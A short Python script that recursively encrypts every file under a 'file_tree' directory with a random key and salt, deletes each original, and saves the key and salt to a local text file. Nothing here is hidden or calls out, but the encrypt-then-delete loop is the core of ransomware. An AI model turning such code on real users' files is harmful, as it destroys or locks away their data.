from lib import files
from os import path, listdir, remove
from Crypto.Random import get_random_bytes

keyspath = path.join(
    'key-salt.txt'
)

key = get_random_bytes(16)
salt = get_random_bytes(16)


def encrypt_dir(dir):
    for filename in listdir(dir):
        filepath = path.join(dir, filename)

        if (path.isdir(filepath)):
            if (filename in ['venv', '__pycache__', 'git']):
                continue

            print(filename)
            encrypt_dir(filepath)
            continue

        files.encrypt_file(key, salt, filepath)
        remove(filepath)


encrypt_dir('file_tree')

files.save_keys(keyspath, key, salt)
